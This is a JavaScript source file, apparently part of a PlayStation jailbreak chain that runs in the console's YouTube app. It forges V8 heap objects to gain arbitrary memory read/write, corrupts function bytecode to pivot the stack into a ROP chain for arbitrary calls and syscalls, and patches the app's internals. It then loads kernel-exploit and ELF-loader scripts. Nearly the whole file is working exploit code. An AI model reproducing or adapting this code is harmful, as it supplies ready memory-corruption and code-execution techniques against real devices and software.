        const fake_frame_data = fake_frame_base + 0x58n;
        const fake_frame_obj = fake_frame_base + 0x98n;
        
        const fake_buffer_rw2_obj = base + 0x0800n;
        const fake_buffer_rw2_elements = base + 0x0850n;
        
        // Objects outside fake_rw accessible range
        const fake_buffer_rw_obj = base + 0x1000n;
        const fake_buffer_rw_elements = base + 0x1050n;
        const fake_array_obj = base + 0x1100n;
        const fake_rw_obj = base + 0x1200n;
        const fake_rw_elements = base + 0x1250n;
        
        // ROP chain with external storage
        const fake_rop_chain_data = base + 0x2000n;
        const fake_rop_chain_buffer_obj = base + 0x3000n;
        const fake_rop_chain_buffer_elements = base + 0x3050n;
        const fake_rop_chain_obj = base + 0x3100n;
        const fake_rop_chain_elements = base + 0x3150n;
        
        // return_value_buf with inline storage
        const fake_return_value_elements = base + 0x4000n;
        const fake_return_value_buffer_obj = base + 0x4100n;
        const fake_return_value_buffer_elements = base + 0x4150n;
        const fake_return_value_obj = base + 0x4200n;
        
        // Create fake Array elements inside fake_rw_data region
        // FixedArray: map + length + data slots
        write64_unstable(fake_array_elements_data + 0x00n, array_elem_map);
        write64_unstable(fake_array_elements_data + 0x08n, 0x0000001000000000n);  // length = 16 slots (Smi)
        
        for (let i = 0n; i < 16n; i++) {
            write64_unstable(fake_array_elements_data + 0x10n + i * 8n, 0n);
        }
        
        // Create fake Array object pointing to elements inside fake_rw_data
        write64_unstable(fake_array_obj + 0x00n, array_map);
        write64_unstable(fake_array_obj + 0x08n, array_props);
        write64_unstable(fake_array_obj + 0x10n, fake_array_elements_data + 1n);  // elements (tagged)
        write64_unstable(fake_array_obj + 0x18n, 0x0000001000000000n);  // length = 16 (Smi)
        
        // Create fake ArrayBuffer #1 elements
        write64_unstable(fake_buffer_rw_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #1 (buffer_rw)
        write64_unstable(fake_buffer_rw_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw_obj + 0x10n, fake_buffer_rw_elements + 1n);
        write64_unstable(fake_buffer_rw_obj + 0x18n, 0x1000n);  // byte_length
        write64_unstable(fake_buffer_rw_obj + 0x20n, fake_rw_data);  // backing_store
        write64_unstable(fake_buffer_rw_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw_obj + 0x30n, 0n);  // bit_field
        
        // Create fake ArrayBuffer #2 elements
        write64_unstable(fake_buffer_rw2_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_buffer_rw2_elements + 0x08n, buffer_elem_len);
        
        // Create fake ArrayBuffer #2 (buffer_rw2)
        write64_unstable(fake_buffer_rw2_obj + 0x00n, buffer_map);
        write64_unstable(fake_buffer_rw2_obj + 0x08n, buffer_props);
        write64_unstable(fake_buffer_rw2_obj + 0x10n, fake_buffer_rw2_elements + 1n);
        write64_unstable(fake_buffer_rw2_obj + 0x18n, 0x200n);  // byte_length
        write64_unstable(fake_buffer_rw2_obj + 0x20n, fake_rw2_data);  // backing_store
        write64_unstable(fake_buffer_rw2_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_buffer_rw2_obj + 0x30n, 0n);  // bit_field
        
        // Create fake BigUint64Array #2 elements
        write64_unstable(fake_arr2_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_arr2_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #2 (fake_arr2)
        write64_unstable(fake_arr2_obj + 0x00n, biguint_map);
        write64_unstable(fake_arr2_obj + 0x08n, biguint_props);
        write64_unstable(fake_arr2_obj + 0x10n, fake_arr2_elements + 1n);
        write64_unstable(fake_arr2_obj + 0x18n, fake_buffer_rw2_obj + 1n);
        write64_unstable(fake_arr2_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_arr2_obj + 0x28n, 0x200n);  // byte_length
        write64_unstable(fake_arr2_obj + 0x30n, 0x40n);  // length
        write64_unstable(fake_arr2_obj + 0x38n, fake_rw2_data);  // external_pointer
        write64_unstable(fake_arr2_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake BigUint64Array #1 elements
        write64_unstable(fake_rw_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rw_elements + 0x08n, biguint_elem_len);
        
        // Create fake BigUint64Array #1 (fake_rw) - overlaps with fake_rw_data
        write64_unstable(fake_rw_obj + 0x00n, biguint_map);
        write64_unstable(fake_rw_obj + 0x08n, biguint_props);
        write64_unstable(fake_rw_obj + 0x10n, fake_rw_elements + 1n);
        write64_unstable(fake_rw_obj + 0x18n, fake_buffer_rw_obj + 1n);
        write64_unstable(fake_rw_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rw_obj + 0x28n, 0x1000n);  // byte_length
        write64_unstable(fake_rw_obj + 0x30n, 0x200n);  // length (increased to 512)
        write64_unstable(fake_rw_obj + 0x38n, fake_rw_data);  // external_pointer
        write64_unstable(fake_rw_obj + 0x40n, 0n);  // base_pointer
        
        // ArrayBuffer (0x00 - 0x37)
        write64_unstable(fake_bc_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_bc_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_bc_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_bc_buffer + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_bc_buffer + 0x20n, 0n);     // backing_store = NULL
        write64_unstable(fake_bc_buffer + 0x28n, 0n);     // extension
        write64_unstable(fake_bc_buffer + 0x30n, small_buffer_bit_field);
        
        // Padding (0x38 - 0x47) - 16 bytes of zeros
        write64_unstable(fake_bc_buffer + 0x38n, 0n);
        write64_unstable(fake_bc_buffer + 0x40n, 0n);
        
        // Elements (0x48 - 0x57)
        write64_unstable(fake_bc_elements + 0x00n, small_elem_map);
        write64_unstable(fake_bc_elements + 0x08n, small_elem_length_field);
        
        // BigUint64Array object (0x98 - 0xDF)
        write64_unstable(fake_bc_obj + 0x00n, small_map);
        write64_unstable(fake_bc_obj + 0x08n, small_props);
        write64_unstable(fake_bc_obj + 0x10n, fake_bc_elements + 1n);  // elements (tagged)
        write64_unstable(fake_bc_obj + 0x18n, fake_bc_buffer + 1n);    // buffer (tagged)
        write64_unstable(fake_bc_obj + 0x20n, 0n);     // byte_offset
        write64_unstable(fake_bc_obj + 0x28n, 0x40n);  // byte_length = 64
        write64_unstable(fake_bc_obj + 0x30n, 0x8n);   // length = 8
        write64_unstable(fake_bc_obj + 0x38n, 0xfn);   // external_ptr = 15
        write64_unstable(fake_bc_obj + 0x40n, fake_bc_elements + 1n);  // base_pointer (tagged)
        
        write64_unstable(fake_frame_buffer + 0x00n, small_buffer_map);
        write64_unstable(fake_frame_buffer + 0x08n, small_buffer_props);
        write64_unstable(fake_frame_buffer + 0x10n, small_buffer_elements);
        write64_unstable(fake_frame_buffer + 0x18n, 0x40n);
        write64_unstable(fake_frame_buffer + 0x20n, 0n);
        write64_unstable(fake_frame_buffer + 0x28n, 0n);
        write64_unstable(fake_frame_buffer + 0x30n, small_buffer_bit_field);
        
        write64_unstable(fake_frame_buffer + 0x38n, 0n);  // Padding ?
        write64_unstable(fake_frame_buffer + 0x40n, 0n);  // Padding
        
        write64_unstable(fake_frame_elements + 0x00n, small_elem_map);
        write64_unstable(fake_frame_elements + 0x08n, small_elem_length_field);
        
        // This looks like BigUint64Array but it is NOT!!!!
        // Using BigUint64Array for fake frame makes GC angry
        // Instead use double object
        // But I will leave BigUint64Array struct except map
        // So I can keep use the existing ROP code
        write64_unstable(fake_frame_obj + 0x00n, heap_number_map);
        write64_unstable(fake_frame_obj + 0x08n, small_props);
        write64_unstable(fake_frame_obj + 0x10n, fake_frame_elements + 1n);
        write64_unstable(fake_frame_obj + 0x18n, fake_frame_buffer + 1n);
        write64_unstable(fake_frame_obj + 0x20n, 0n);
        write64_unstable(fake_frame_obj + 0x28n, 0x40n);
        write64_unstable(fake_frame_obj + 0x30n, 0x8n);
        write64_unstable(fake_frame_obj + 0x38n, 0xfn);
        write64_unstable(fake_frame_obj + 0x40n, fake_frame_elements + 1n);
        
        for (let i = 0n; i < 0x40n; i += 8n) {
            write64_unstable(fake_bc_data + i, 0n);
            write64_unstable(fake_frame_data + i, 0n);
        }
        
        // Create fake rop_chain elements
        write64_unstable(fake_rop_chain_elements + 0x00n, biguint_elem_map);
        write64_unstable(fake_rop_chain_elements + 0x08n, biguint_elem_len);
        
        // Create fake rop_chain ArrayBuffer elements
        write64_unstable(fake_rop_chain_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_rop_chain_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake rop_chain ArrayBuffer
        write64_unstable(fake_rop_chain_buffer_obj + 0x00n, buffer_map);
        write64_unstable(fake_rop_chain_buffer_obj + 0x08n, buffer_props);
        write64_unstable(fake_rop_chain_buffer_obj + 0x10n, fake_rop_chain_buffer_elements + 1n);
        write64_unstable(fake_rop_chain_buffer_obj + 0x18n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_buffer_obj + 0x20n, fake_rop_chain_data);  // backing_store
        write64_unstable(fake_rop_chain_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_rop_chain_buffer_obj + 0x30n, 0n);  // bit_field
        
        // Create fake rop_chain BigUint64Array (external storage)
        write64_unstable(fake_rop_chain_obj + 0x00n, biguint_map);
        write64_unstable(fake_rop_chain_obj + 0x08n, biguint_props);
        write64_unstable(fake_rop_chain_obj + 0x10n, fake_rop_chain_elements + 1n);
        write64_unstable(fake_rop_chain_obj + 0x18n, fake_rop_chain_buffer_obj + 1n);
        write64_unstable(fake_rop_chain_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_rop_chain_obj + 0x28n, 0x800n);  // byte_length
        write64_unstable(fake_rop_chain_obj + 0x30n, 0x100n);  // length
        write64_unstable(fake_rop_chain_obj + 0x38n, fake_rop_chain_data);  // external_pointer
        write64_unstable(fake_rop_chain_obj + 0x40n, 0n);  // base_pointer
        
        // Create fake return_value_buf elements (inline storage)
        write64_unstable(fake_return_value_elements + 0x00n, small_elem_map);
        write64_unstable(fake_return_value_elements + 0x08n, small_elem_length_field);
        
        // Create fake return_value_buf ArrayBuffer elements
        write64_unstable(fake_return_value_buffer_elements + 0x00n, buffer_elem_map);
        write64_unstable(fake_return_value_buffer_elements + 0x08n, buffer_elem_len);
        
        // Create fake return_value_buf ArrayBuffer
        write64_unstable(fake_return_value_buffer_obj + 0x00n, small_buffer_map);
        write64_unstable(fake_return_value_buffer_obj + 0x08n, small_buffer_props);
        write64_unstable(fake_return_value_buffer_obj + 0x10n, small_buffer_elements);
        write64_unstable(fake_return_value_buffer_obj + 0x18n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_buffer_obj + 0x20n, 0n);  // backing_store = null
        write64_unstable(fake_return_value_buffer_obj + 0x28n, 0n);  // extension
        write64_unstable(fake_return_value_buffer_obj + 0x30n, small_buffer_bit_field);
        
        // Create fake return_value_buf BigUint64Array (inline storage)
        write64_unstable(fake_return_value_obj + 0x00n, small_map);
        write64_unstable(fake_return_value_obj + 0x08n, small_props);
        write64_unstable(fake_return_value_obj + 0x10n, fake_return_value_elements + 1n);
        write64_unstable(fake_return_value_obj + 0x18n, fake_return_value_buffer_obj + 1n);
        write64_unstable(fake_return_value_obj + 0x20n, 0n);  // byte_offset
        write64_unstable(fake_return_value_obj + 0x28n, 0x40n);  // byte_length
        write64_unstable(fake_return_value_obj + 0x30n, 0x8n);  // length
        write64_unstable(fake_return_value_obj + 0x38n, 0xfn);  // external_pointer
        write64_unstable(fake_return_value_obj + 0x40n, fake_return_value_elements + 1n);  // base_pointer
        
        // Materialize fake objects
        const fake_rw = create_fakeobj_unstable(fake_rw_obj);
        const fake_arr2 = create_fakeobj_unstable(fake_arr2_obj);
        const fake_array = create_fakeobj_unstable(fake_array_obj);
        
        // Calculate offsets for accessing via fake_rw
        const arr2_external_offset = Number((fake_arr2_obj + 0x38n - fake_rw_data) / 8n);
        const fake_array_slot0_offset = Number((fake_array_elements_data + 0x10n - fake_rw_data) / 8n);
        
        // Stable primitives
        addrof = function(obj) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_array[0] = obj;
            const addr = fake_rw[fake_array_slot0_offset] - 1n;
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return addr;
        }
        
        read64 = function(addr) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            const value = fake_arr2[0];
            fake_rw[arr2_external_offset] = arr2_external_org;
            return value;
        }
        
        write64 = function(addr, value) {
            const arr2_external_org = fake_rw[arr2_external_offset];
            fake_rw[arr2_external_offset] = addr;
            fake_arr2[0] = value;
            fake_rw[arr2_external_offset] = arr2_external_org;
        }
        
        create_fakeobj = function(addr) {
            const arr_elements_org = fake_rw[fake_array_slot0_offset];
            fake_rw[fake_array_slot0_offset] = addr + 1n;
            const fake_obj = fake_array[0];
            fake_rw[fake_array_slot0_offset] = arr_elements_org;
            return fake_obj;
        }                

        read8 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFn;
        }

        write8 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }

        read16 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFn;
        }
        
        write16 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        read32 = function(addr) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            return (qword >> BigInt(byte_offset * 8)) & 0xFFFFFFFFn;
        }

        write32 = function(addr, value) {
            const qword = read64(addr & ~7n);
            const byte_offset = Number(addr & 7n);
            const mask = 0xFFFFFFFFn << BigInt(byte_offset * 8);
            const new_qword = (qword & ~mask) | ((BigInt(value) & 0xFFFFFFFFn) << BigInt(byte_offset * 8));
            write64(addr & ~7n, new_qword);
        }
        
        get_backing_store = function(typed_array) {
            const obj_addr = addrof(typed_array);
            const external = read64(obj_addr + 0x38n);
            const base = read64(obj_addr + 0x40n);
            return base + external;
        }
        
        malloc = function(size) {
            const buffer = new ArrayBuffer(Number(size));
            const buffer_addr = addrof(buffer);
            const backing_store = read64(buffer_addr + 0x20n);
            allocated_buffers.push(buffer);
            return backing_store;
        }
        
        await log("Stable primitive achieved");
        
        await log("Setting up ROP...");
        
        // https://github.com/google/google-ctf/tree/main/2023/quals/sandbox-v8box/solution
        // We don't have pointer compression
        
        // Make bytecode larger and just use it's address
        // No separate fake bytecode buffer
        pwn = function(x) {
            let dummy1 = x + 1;
            let dummy2 = x + 2;
            let dummy3 = x + 3;
            let dummy4 = x + 4;
            let dummy5 = x + 5;
            return x;
        }
        
        pwn(1); // Generate bytecode
        
        get_bytecode_addr = function() {
            const pwn_addr = addrof(pwn); // JSFunction
            const sfi_addr = read64(pwn_addr + 0x18n) - 1n; // SharedFunctionInfo
            const bytecode_addr = read64(sfi_addr + 0x8n) - 1n; // BytecodeArray
            return bytecode_addr;
        }
        
        rop_chain = create_fakeobj(fake_rop_chain_obj);
        fake_bc = create_fakeobj(fake_bc_obj);
        fake_frame = create_fakeobj(fake_frame_obj);
        return_value_buf = create_fakeobj(fake_return_value_obj);
        
        //await log("fake_bc @ " + toHex(addrof(fake_bc)));
        //await log("fake_frame @ " + toHex(addrof(fake_frame)));
        
        const bytecode_addr = get_bytecode_addr();
        //await log("BytecodeArray @ " + toHex(bytecode_addr));
        
        bc_start = bytecode_addr + 0x36n;
        write64(bc_start, 0xAB0025n);
        
        const stack_addr = addrof(pwn(1)) + 0x1n;
        await log("Stack leak @ " + toHex(stack_addr));
        
        eboot_base = read64(stack_addr + 0x8n) - 0xFBC81Fn;
        await log("eboot_base @ " + toHex(eboot_base));
        
        libc_base = read64(eboot_base + 0x2A66660n) - 0x851A0n;
        await log("libc_base @ " + toHex(libc_base));
        
        const rop_chain_addr = get_backing_store(rop_chain);
        //await log("ROP chain @ " + toHex(rop_chain_addr));
        
        // Fake bytecode for r14 register
        fake_bc[0] = 0xABn; // Return opcode - keeps interpreter happy
        const fake_bc_addr = get_backing_store(fake_bc);
        //await log("Fake bytecode @ " + toHex(fake_bc_addr));
        
        const fake_frame_backing = get_backing_store(fake_frame);
        
        // This sets the r14 register which V8 expects to point to bytecode
        write64(fake_frame_backing + 0x21n, fake_bc_addr);
        
        return_value_addr = get_backing_store(return_value_buf);
        //await log("return_value_addr @ " + toHex(return_value_addr));

        const fake_frame_addr = addrof(fake_frame);
        // Pivot RSP
        write64(fake_frame_addr + 0x09n, ROP.pop_rsp); // pop rsp ; ret
        write64(fake_frame_addr + 0x11n, rop_chain_addr);

        call_rop = function(address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            let rop_i = 0;
            
            // Syscall number
            rop_chain[rop_i++] = ROP.pop_rax; // pop rax ; ret
            rop_chain[rop_i++] = rax;
            
            // Setup arguments
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = arg1;
            rop_chain[rop_i++] = ROP.pop_rsi; // pop rsi ; ret
            rop_chain[rop_i++] = arg2;
            rop_chain[rop_i++] = ROP.pop_rdx; // pop rdx ; ret
            rop_chain[rop_i++] = arg3;
            rop_chain[rop_i++] = ROP.pop_rcx; // pop rcx ; ret
            rop_chain[rop_i++] = arg4;
            rop_chain[rop_i++] = ROP.pop_r8; // pop r8 ; ret
            rop_chain[rop_i++] = arg5;
            rop_chain[rop_i++] = ROP.pop_r9; // pop r9 ; ret
            rop_chain[rop_i++] = arg6;

            // Call function
            rop_chain[rop_i++] = address; 
            
            // Store return value to return_value_addr
            rop_chain[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
            rop_chain[rop_i++] = return_value_addr;
            rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
            
            // Return safe tagged value to JavaScript
            rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret

            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret ;
            rop_chain[rop_i++] = saved_fp;
            
            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
            
            return pwn(fake_frame);
        }
        
        
        call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            
            saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n); //Ldar 0x3, Star fp, Return
            
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        rop_test = call(ROP.mov_rax_0x200000000);
        await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
        
        if (rop_test !== 0x200000000n) {
            await log("ERROR: ROP test failed");
            throw new Error("ROP test failed");
        }
        
        // Thanks ufm42 for better implementation
        await log("Disabling PSN dialog and YouTube splash...");

        const window_addr = addrof(window);
        //await log("window_addr: " + toHex(window_addr));
        
        const wrapper_private_addr = read64(window_addr + 0x20n);
        //await log("wrapper_private_addr: " + toHex(wrapper_private_addr));
        
        const isolate_addr = read64(wrapper_private_addr + 0x8n);
        //await log("isolate_addr: " + toHex(isolate_addr));
        
        const splash_screen_dom_window_addr = read64(wrapper_private_addr + 0x10n);
        //await log("splash_screen_dom_window_addr: " + toHex(splash_screen_dom_window_addr));
        
        const navigator_addr = read64(splash_screen_dom_window_addr + 0xC0n);
        //await log("navigator_addr: " + toHex(navigator_addr));
        
        const maybe_freeze_callback_addr = read64(navigator_addr + 0xB0n);
        //await log("maybe_freeze_callback_addr: " + toHex(maybe_freeze_callback_addr));
        
        const browser_module_addr = read64(maybe_freeze_callback_addr + 0x30n);
        //await log("browser_module_addr: " + toHex(browser_module_addr));
        
        const main_web_module_addr = read64(browser_module_addr + 0x678n);
        //await log("main_web_module_addr: " + toHex(main_web_module_addr));
        
        const main_web_module_impl_addr = read64(main_web_module_addr + 0x18n);
        //await log("main_web_module_impl_addr: " + toHex(main_web_module_impl_addr));
        
        const main_dom_window_addr = read64(main_web_module_impl_addr + 0x230n);
        //await log("main_dom_window_addr: " + toHex(main_dom_window_addr));
        
        const splash_screen_addr = read64(browser_module_addr + 0x898n);
        //await log("splash_screen_addr: " + toHex(splash_screen_addr));
        
        const splash_screen_web_module_addr = read64(splash_screen_addr + 0x20n);
        //await log("splash_screen_web_module_addr: " + toHex(splash_screen_web_module_addr));
        
        const splash_screen_web_module_impl_addr = read64(splash_screen_web_module_addr + 0x18n);
        //await log("splash_screen_web_module_impl_addr: " + toHex(splash_screen_web_module_impl_addr));

        //await log("Disabling YouTube splash screen...");
        const main_web_module_generation_addr = browser_module_addr + 0xB08n;
        write32(main_web_module_generation_addr, 0xFFFFFFFFn); // Set to -1 (64-bit)
        await log("YT splash disabled!");

        await log("Disabling PSN popup...");
        // Get sceCommonDialogInitialize address and find libSceCommonDialog base
        const sceCommonDialogInitialize_addr = read64(eboot_base + 0x2A65F98n);
        //await log("sceCommonDialogInitialize_addr: " + toHex(sceCommonDialogInitialize_addr));
        
        const sceCommonDialogTerminate_addr = sceCommonDialogInitialize_addr + 0x70n;
        call(sceCommonDialogTerminate_addr);
        
        // Disable "no internet connection" retry timer
        const on_error_retry_timer_addr = browser_module_addr + 0x960n;
        //await log("on_error_retry_timer_addr: " + toHex(on_error_retry_timer_addr));
        
        const is_running_addr = on_error_retry_timer_addr + 0x60n;
        //await log("is_running_addr: " + toHex(is_running_addr));
        
        // Set is_running to 1 (true)
        write8(is_running_addr, 0x1n);
        
        await log("PSN popup disabled!");

        // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
        sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
        //await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));
        
        //gettimeofday plt
        //0x113B18
        const gettimeofdayAddr = read64(libc_base + 0x113B18n);
        //await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
        
        const mod_info = malloc(0x300);
        //await log("mod_info buffer @ " + toHex(mod_info));
        
        const SEGMENTS_OFFSET = 0x160n;
        
        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));

        if (ret !== 0x0n) {
            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }
        
        libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
        //await log("libkernel_base @ " + toHex(libkernel_base));

        syscall_wrapper = gettimeofdayAddr + 0x7n;
        //await log("syscall_wrapper @ " + toHex(syscall_wrapper));
        
        syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            if(syscall_num === undefined) {
                throw new Error("ERROR: syscall not defined");
            }
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        libc_strerror = libc_base + 0x73520n;
        libc_error = libc_base + 0xCC5A0n;
        
        await load_localscript('misc.js');
        
        window.original_send_notification = window.send_notification;
        window.send_notification = function(text) {
            let isSystemNotify = false;
            if (typeof text === 'string') {
                const lowerText = text.toLowerCase();
                if (lowerText.includes("[error]") || lowerText.includes("[-]") || 
                    lowerText.includes("error") || lowerText.includes("failed") || 
                    lowerText.includes("exception") || lowerText.includes("lapse") || 
                    lowerText.includes("jailbroken") || lowerText.includes("exploit")) {
                    isSystemNotify = true;
                }
            }
            
            if (isSystemNotify && typeof window.original_send_notification === 'function') {
                window.original_send_notification(text);
            }

            if (typeof window.uiLog === 'function') {
                window.uiLog(text, isSystemNotify ? "error" : "info");
            }
        };

        await checkLogServer();
        
        FW_VERSION = get_fwversion();
        send_notification("FW: " + FW_VERSION);

        await log("FW detected : " + FW_VERSION);
        
        await log("libkernel_base @ " + toHex(libkernel_base));
        try {
            SCE_KERNEL_DLSYM = libkernel_base + get_dlsym_offset(FW_VERSION);
            await log("SCE_KERNEL_DLSYM @ " + toHex(SCE_KERNEL_DLSYM));
        } catch (e) {
            SCE_KERNEL_DLSYM = sceKernelGetModuleInfoFromAddr - 0x450n;
            await log("WARNING : sceKernelDlsym offset not found\nUsing predicted value " + toHex(SCE_KERNEL_DLSYM));
        }
        
        // Used for gpu rw
        sceKernelAllocateMainDirectMemory = read64(eboot_base + 0x2A65EF8n);
        // Same thing with sceKernelMapDirectMemory but with name assigning.
        // Using this because don't want to use dlsym
        sceKernelMapNamedDirectMemory = read64(eboot_base + 0x2A65F00n); 
        
        Thrd_create = libc_base + 0x4BF0n;
        Thrd_join = libc_base + 0x49F0n;
        
        await load_localscript('kernel.js');
        await load_localscript('kernel_offset.js');
        await load_localscript('gpu.js');

        await load_localscript('elf_loader.js');
                
        ////////////////////
        // MAIN EXECUTION //
        ////////////////////

        await load_localscript('lapse.js');
        await load_localscript('update.js');
        await load_localscript('icon_update.js');
        await load_localscript('autoload.js');
        if (typeof window.updateProgress === 'function') {
            window.updateProgress(20, "Running kernel exploit...");
        }

        await start_lapse();

        if (typeof window.updateProgress === 'function') {
            window.updateProgress(50, "Kernel exploit finished.");
        }

        await start_update();
        await start_icon_update();
        await start_autoload();

        if (typeof window.updateProgress === 'function') {
            window.updateProgress(100, "Autoload finished.");
        }
        send_notification("Closing YT app");
        await kill_youtube(500);

    } catch (e) {                
        if (typeof window.hideUI === 'function') window.hideUI();
        await log('EXCEPTION: ' + e.message);
        await log(e.stack);
        await kill_youtube();
    }
    
})();
